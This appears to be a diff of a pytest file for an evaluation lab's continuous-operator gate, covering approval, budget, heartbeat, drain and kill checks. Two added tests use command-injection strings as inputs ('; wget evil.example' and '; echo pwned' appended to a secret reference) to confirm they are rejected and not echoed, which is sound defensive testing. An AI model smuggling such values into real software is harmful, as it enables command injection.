@@ -2,17 +2,22 @@
 
 from __future__ import annotations
 
+import io
 import json
 import os
 import plistlib
+import shutil
 import stat
 import subprocess
+from contextlib import redirect_stdout
 from datetime import UTC, datetime, timedelta
 from pathlib import Path
+from types import SimpleNamespace
 
 import pytest
 import yaml
 
+from evallab.execution_contracts import PaidRunAuthorization
 from evallab.ops_continuous import (
     KILL_DISPOSITION,
     REASON_BILLABLE_REFUSED,
@@ -24,19 +29,21 @@ from evallab.ops_continuous import (
     REASON_MISSING_STANDING_APPROVAL,
     REASON_SAME_IDENTITY,
     REASON_STALE_HEARTBEAT,
+    authorization_digest,
     main,
-    make_signed_manifest,
     policy_complete,
 )
 
 ROOT = Path(__file__).resolve().parents[1]
 SCRIPT = ROOT / "scripts/ops/continuous-operator"
+KEYCHAIN = ROOT / "scripts/ops/keychain-inject.sh"
 PLIST = ROOT / "scripts/ops/launchd/com.petermakhnatch.evallab.continuous-operator.plist"
 SERVICE = ROOT / "scripts/ops/systemd/evallab-continuous-operator.service"
 TIMER = ROOT / "scripts/ops/systemd/evallab-continuous-operator.timer"
 COMPOSE = ROOT / "containers/continuous-operator/compose.yaml"
 DOCKERFILE = ROOT / "containers/continuous-operator/Dockerfile"
 EXAMPLE_POLICY = ROOT / "policy/continuous-loop-policy.example.yaml"
+STANDING = ROOT / "policy/standing-approvals.yaml"
 SECRET_SCAN_ROOTS = (
     ROOT / "scripts/ops",
     ROOT / "containers/continuous-operator",
@@ -50,19 +57,26 @@ APPROVAL = "approval-key"
 BUDGET = "budget-key"
 
 
+def _auth(*, actor: str, spec_id: str, at: datetime = NOW) -> dict:
+    return {
+        "spec_id": spec_id,
+        "actor": actor,
+        "authorized_at": at.isoformat(),
+        "quota_override": False,
+    }
+
+
 def _complete_policy_body(*, stale_after: float = 60.0, drain_timeout: float = 5.0) -> dict:
-    payload = {"scope": ["continuous-loop"]}
-    approval = make_signed_manifest(
-        authority_kind="campaign_approval",
-        signer_identity=APPROVAL,
-        payload=payload,
-        expires_at=NOW + timedelta(hours=1),
+    approval = PaidRunAuthorization(
+        spec_id="01CONTINUOUSAPPROVAL00000001",
+        actor=APPROVAL,
+        authorized_at=NOW,
     )
     return {
         "continuous_loop_policy": {
             "policy_schema_version": "1",
             "approval_signature_ref": APPROVAL,
-            "approval_digest": approval["payload_digest"],
+            "approval_digest": authorization_digest(approval),
             "slo_freshness": {
                 "max_queue_admission_lag_seconds": 30,
                 "max_dispatch_latency_seconds": 30,
@@ -103,28 +117,15 @@ def _policy(path: Path, *, stale_after: float = 60.0, drain_timeout: float = 5.0
     return path
 
 
-def _write_manifests(state: Path, *, approval_signer: str = APPROVAL, budget_signer: str = BUDGET) -> None:
+def _write_auths(state: Path, *, approval_actor: str = APPROVAL, budget_actor: str = BUDGET) -> None:
     state.mkdir(exist_ok=True)
     (state / "approval.json").write_text(
-        json.dumps(
-            make_signed_manifest(
-                authority_kind="campaign_approval",
-                signer_identity=approval_signer,
-                payload={"scope": ["continuous-loop"]},
-                expires_at=NOW + timedelta(hours=1),
-            )
-        )
+        json.dumps(_auth(actor=approval_actor, spec_id="01CONTINUOUSAPPROVAL00000001"))
     )
     (state / "budget.json").write_text(
-        json.dumps(
-            make_signed_manifest(
-                authority_kind="budget",
-                signer_identity=budget_signer,
-                payload={"scope": ["continuous-loop"], "ceiling_usd": 0},
-                expires_at=NOW + timedelta(hours=1),
-            )
-        )
+        json.dumps(_auth(actor=budget_actor, spec_id="01CONTINUOUSBUDGET0000000001"))
     )
+    shutil.copy2(STANDING, state / "standing-approvals.yaml")
 
 
 def _gate_env() -> dict[str, str]:
@@ -144,24 +145,26 @@ def _run(
     extra: list[str] | None = None,
     policy: Path | None = None,
     agent: str | None = None,
-    now: str | None = None,
-) -> subprocess.CompletedProcess[str]:
+    now: datetime | None = None,
+) -> SimpleNamespace:
     state = tmp_path / "state"
     state.mkdir(exist_ok=True)
-    argv = ["uv", "run", "python", "-m", "evallab.ops_continuous", command, "--state-dir", str(state)]
+    argv = [command, "--state-dir", str(state)]
     if policy is not None:
         argv.extend(["--policy", str(policy)])
     if agent is not None:
         argv.extend(["--agent", agent])
-    if now is not None:
-        argv.extend(["--now", now])
     if extra:
         argv.extend(extra)
     merged = {**os.environ, **(env or {})}
-    return subprocess.run(argv, cwd=ROOT, capture_output=True, text=True, env=merged)
+    buf = io.StringIO()
+    clock = (lambda: now) if now is not None else None
+    with redirect_stdout(buf):
+        code = main(argv, environ=merged, clock=clock)
+    return SimpleNamespace(returncode=code, stdout=buf.getvalue())
 
 
-def _payload(result: subprocess.CompletedProcess[str]) -> dict:
+def _payload(result: SimpleNamespace) -> dict:
     return json.loads(result.stdout)
 
 
@@ -194,30 +197,34 @@ def test_missing_standing_approval(tmp_path: Path) -> None:
     assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
 
 
-def test_unsigned_approval_digest_mismatch(tmp_path: Path) -> None:
-    state = tmp_path / "state"
-    _write_manifests(state)
-    tampered = json.loads((state / "approval.json").read_text())
-    tampered["payload_digest"] = "0" * 64
-    (state / "approval.json").write_text(json.dumps(tampered))
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW.isoformat())
-    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
-
-
-def test_expired_approval_refused(tmp_path: Path) -> None:
+def test_parallel_signed_manifest_is_rejected(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "approval.json").write_text(
         json.dumps(
-            make_signed_manifest(
-                authority_kind="campaign_approval",
-                signer_identity=APPROVAL,
-                payload={"scope": ["continuous-loop"]},
-                expires_at=NOW - timedelta(seconds=1),
-            )
+            {
+                "schema_version": "1",
+                "authority_kind": "campaign_approval",
+                "signer_identity": APPROVAL,
+                "payload": {},
+                "payload_digest": "a" * 64,
+                "signature": "b" * 64,
+                "expires_at": (NOW + timedelta(hours=1)).isoformat(),
+                "scope": ["continuous-loop"],
+            }
         )
     )
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW.isoformat())
+    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
+    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
+
+
+def test_future_authorization_is_refused(tmp_path: Path) -> None:
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "approval.json").write_text(
+        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001", at=NOW + timedelta(hours=1)))
+    )
+    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL
 
 
@@ -225,16 +232,9 @@ def test_missing_budget(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "approval.json").write_text(
-        json.dumps(
-            make_signed_manifest(
-                authority_kind="campaign_approval",
-                signer_identity=APPROVAL,
-                payload={"scope": ["continuous-loop"]},
-                expires_at=NOW + timedelta(hours=1),
-            )
-        )
+        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001"))
     )
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW.isoformat())
+    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_BUDGET
 
 
@@ -242,44 +242,48 @@ def test_env_budget_flag_is_not_authority(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "approval.json").write_text(
-        json.dumps(
-            make_signed_manifest(
-                authority_kind="campaign_approval",
-                signer_identity=APPROVAL,
-                payload={"scope": ["continuous-loop"]},
-                expires_at=NOW + timedelta(hours=1),
-            )
-        )
+        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001"))
     )
     env = {**_gate_env(), "EVAL_LAB_BUDGET_PRESENT": "1"}
-    result = _run(tmp_path, "quota", env=env, now=NOW.isoformat())
+    result = _run(tmp_path, "quota", env=env, now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_BUDGET
 
 
 def test_missing_secret(tmp_path: Path) -> None:
     state = tmp_path / "state"
-    _write_manifests(state)
+    _write_auths(state)
     env = {
         "EVAL_LAB_ENABLE_TOKEN": "enable-1",
         "EVAL_LAB_ENABLE_IDENTITY": ENABLE,
         "EVAL_LAB_SECRET_REF": "keychain:lab/operator",
     }
-    result = _run(tmp_path, "quota", env=env, now=NOW.isoformat())
+    result = _run(tmp_path, "quota", env=env, now=NOW)
     assert result.returncode == 2
+    assert _payload(result)["reason"] == REASON_MISSING_SECRET
+
+
+def test_invalid_secret_ref_grammar(tmp_path: Path) -> None:
+    state = tmp_path / "state"
+    _write_auths(state)
+    env = {
+        **_gate_env(),
+        "EVAL_LAB_SECRET_REF": "keychain:lab/operator; wget evil.example",
+    }
+    result = _run(tmp_path, "quota", env=env, now=NOW)
     assert _payload(result)["reason"] == REASON_MISSING_SECRET
 
 
 def test_same_enable_and_approval_identity(tmp_path: Path) -> None:
     state = tmp_path / "state"
-    _write_manifests(state, approval_signer=ENABLE)
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW.isoformat())
+    _write_auths(state, approval_actor=ENABLE)
+    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_SAME_IDENTITY
 
 
 def test_budget_signer_must_be_distinct(tmp_path: Path) -> None:
     state = tmp_path / "state"
-    _write_manifests(state, budget_signer=APPROVAL)
-    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW.isoformat())
+    _write_auths(state, budget_actor=APPROVAL)
+    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
     assert _payload(result)["reason"] == REASON_SAME_IDENTITY
 
 
@@ -298,10 +302,47 @@ def test_oracle_dry_run_records_plan_without_harbor(tmp_path: Path) -> None:
     result = _run(tmp_path, "dry-run", agent="oracle")
     assert result.returncode == 0
     body = _payload(result)
-    assert body["would_run"] == "oracle"
-    assert body["harbor"] is False
+    assert body["details"]["would_run"] == "oracle"
+    assert body["details"]["harbor"] is False
+    assert body["running"] is False
     plan = json.loads((tmp_path / "state/dry-run-plan.json").read_text())
     assert plan["dispatch"] is False
+
+
+def test_verdict_does_not_overwrite_safety_fields(tmp_path: Path) -> None:
+    result = _run(tmp_path, "dry-run", agent="oracle")
+    body = _payload(result)
+    colliding = {**body, "running": True, "authorized": True, "ok": False}
+    from evallab.ops_continuous import _verdict, context_from_env
+
+    ctx = context_from_env(
+        state_dir=tmp_path / "state",
+        policy_path=None,
+        now=NOW,
+        agent="oracle",
+        drain_timeout_seconds=None,
+        environ={},
+    )
+    verdict = _verdict(ctx, ok=True, reason=None, detail="x", extra=colliding)
+    assert verdict.payload["running"] is False
+    assert verdict.payload["authorized"] is False
+    assert verdict.payload["ok"] is True
+    assert "running" in verdict.payload["details"]
+
+
+def test_production_now_flag_rejected(tmp_path: Path) -> None:
+    with pytest.raises(SystemExit):
+        main(["validate", "--state-dir", str(tmp_path / "state"), "--now", NOW.isoformat()])
+
+
+def test_operator_now_env_does_not_freeze_clock(tmp_path: Path) -> None:
+    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
+    env = {"EVAL_LAB_OPERATOR_NOW": "2026-08-28T00:00:01+00:00"}
+    result = _run(tmp_path, "status", policy=policy, env=env, now=NOW.replace(minute=5))
+    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT
 
 
 def test_stale_heartbeat_on_status(tmp_path: Path) -> None:
@@ -309,7 +350,7 @@ def test_stale_heartbeat_on_status(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
-    result = _run(tmp_path, "status", policy=policy, now="2026-08-28T00:05:00+00:00")
+    result = _run(tmp_path, "status", policy=policy, now=NOW.replace(minute=5))
     assert result.returncode == 2
     assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT
 
@@ -317,12 +358,13 @@ def test_stale_heartbeat_on_status(tmp_path: Path) -> None:
 def test_stale_heartbeat_on_validate_and_quota(tmp_path: Path) -> None:
     policy = _policy(tmp_path / "policy.yaml", stale_after=30)
     state = tmp_path / "state"
-    _write_manifests(state)
+    _write_auths(state)
     (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
     env = _gate_env()
-    validate = _run(tmp_path, "validate", policy=policy, env=env, now="2026-08-28T00:05:00+00:00")
-    quota = _run(tmp_path, "quota", policy=policy, env=env, now="2026-08-28T00:05:00+00:00")
-    start = _run(tmp_path, "start", policy=policy, env=env, now="2026-08-28T00:05:00+00:00")
+    later = NOW.replace(minute=5)
+    validate = _run(tmp_path, "validate", policy=policy, env=env, now=later)
+    quota = _run(tmp_path, "quota", policy=policy, env=env, now=later)
+    start = _run(tmp_path, "start", policy=policy, env=env, now=later)
     assert _payload(validate)["reason"] == REASON_STALE_HEARTBEAT
     assert _payload(quota)["reason"] == REASON_STALE_HEARTBEAT
     assert _payload(start)["reason"] == REASON_STALE_HEARTBEAT
@@ -333,10 +375,10 @@ def test_fresh_heartbeat_status_unknown_health(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "heartbeat").write_text("2026-08-28T00:04:00+00:00\n")
-    result = _run(tmp_path, "status", policy=policy, now="2026-08-28T00:05:00+00:00")
+    result = _run(tmp_path, "status", policy=policy, now=NOW.replace(minute=5))
     assert result.returncode == 0
     body = _payload(result)
-    assert body["health"]["docker"] == "unknown"
+    assert body["details"]["health"]["docker"] == "unknown"
     assert body["running"] is False
 
 
@@ -345,11 +387,11 @@ def test_graceful_drain_then_timeout(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "inflight.json").write_text(json.dumps(["lease-1"]))
-    waiting = _run(tmp_path, "drain", policy=policy, now="2026-08-28T00:00:00+00:00")
+    waiting = _run(tmp_path, "drain", policy=policy, now=NOW)
     assert waiting.returncode == 2
     assert _payload(waiting)["reason"] == REASON_DRAIN_INCOMPLETE
     assert json.loads((state / "drain.json").read_text())["complete"] is False
-    timed = _run(tmp_path, "drain", policy=policy, now="2026-08-28T00:00:11+00:00")
+    timed = _run(tmp_path, "drain", policy=policy, now=NOW + timedelta(seconds=11))
     assert timed.returncode == 2
     assert _payload(timed)["reason"] == REASON_DRAIN_INCOMPLETE
 
@@ -358,7 +400,7 @@ def test_kill_records_operator_kill(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "inflight.json").write_text(json.dumps(["lease-1"]))
-    result = _run(tmp_path, "kill", now="2026-08-28T00:00:00+00:00")
+    result = _run(tmp_path, "kill", now=NOW)
     assert result.returncode == 0
     record = json.loads((state / "kill.json").read_text())
     assert record["disposition"] == KILL_DISPOSITION
@@ -366,7 +408,7 @@ def test_kill_records_operator_kill(tmp_path: Path) -> None:
     assert record["signalled"] is False
     assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
     assert (state / "mode").read_text().strip() == "KILLED"
-    drain = _run(tmp_path, "drain", now="2026-08-28T00:00:01+00:00")
+    drain = _run(tmp_path, "drain", now=NOW + timedelta(seconds=1))
     assert drain.returncode == 2
     assert _payload(drain)["reason"] == REASON_DRAIN_INCOMPLETE
     assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
@@ -376,13 +418,13 @@ def test_validate_does_not_clear_killed_or_draining(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "inflight.json").write_text(json.dumps(["lease-1"]))
-    kill = _run(tmp_path, "kill", now=NOW.isoformat())
+    kill = _run(tmp_path, "kill", now=NOW)
     assert _payload(kill)["mode"] == "KILLED"
-    validated = _run(tmp_path, "validate", now=NOW.isoformat())
+    validated = _run(tmp_path, "validate", now=NOW)
     assert (state / "mode").read_text().strip() == "KILLED"
     assert _payload(validated)["mode"] == "KILLED"
     (state / "mode").write_text("DRAINING\n")
-    again = _run(tmp_path, "validate", now=NOW.isoformat())
+    again = _run(tmp_path, "validate", now=NOW)
     assert (state / "mode").read_text().strip() == "DRAINING"
     assert _payload(again)["mode"] == "DRAINING"
 
@@ -391,7 +433,7 @@ def test_malformed_inflight_fails_closed(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "inflight.json").write_text(json.dumps({"lease": 1}))
-    result = _run(tmp_path, "drain", now=NOW.isoformat())
+    result = _run(tmp_path, "drain", now=NOW)
     assert result.returncode == 2
     assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
     assert (state / "mode").read_text().strip() == "DRAINING"
@@ -401,7 +443,7 @@ def test_drain_without_timeout_still_incomplete(tmp_path: Path) -> None:
     state = tmp_path / "state"
     state.mkdir()
     (state / "inflight.json").write_text(json.dumps(["lease-1"]))
-    result = _run(tmp_path, "drain", now=NOW.isoformat())
+    result = _run(tmp_path, "drain", now=NOW)
     assert result.returncode == 2
     assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
 
@@ -415,17 +457,33 @@ def test_empty_inflight_drain_disables(tmp_path: Path) -> None:
 def test_full_gates_still_non_running(tmp_path: Path) -> None:
     policy = _policy(tmp_path / "policy.yaml")
     state = tmp_path / "state"
-    _write_manifests(state)
+    _write_auths(state)
     (state / "heartbeat").write_text(NOW.isoformat() + "\n")
-    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW.isoformat())
+    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
     body = _payload(result)
     assert result.returncode == 0
     assert body["mode"] == "DISABLED"
     assert body["running"] is False
     assert body["authorized"] is False
-    start = _run(tmp_path, "start", policy=policy, env=_gate_env(), now=NOW.isoformat())
+    start = _run(tmp_path, "start", policy=policy, env=_gate_env(), now=NOW)
     assert start.returncode == 2
     assert _payload(start)["reason"] == REASON_DEFAULT_DISABLED
+
+
+def test_keychain_inject_never_echoes_secret_ref() -> None:
+    injected = "keychain:lab/operator; echo pwned"
+    completed = subprocess.run(
+        [str(KEYCHAIN)],
+        cwd=ROOT,
+        capture_output=True,
+        text=True,
+        env={**os.environ, "EVAL_LAB_SECRET_REF": injected, "EVAL_LAB_SECRET_PRESENT": "1"},
+    )
+    assert "pwned" not in completed.stdout
+    assert "secret_ref=" not in completed.stdout
+    assert injected not in completed.stdout
+    assert "probe=injected" in completed.stdout
+    assert "present=yes" in completed.stdout
 
 
 def test_launchd_plist_disabled() -> None:
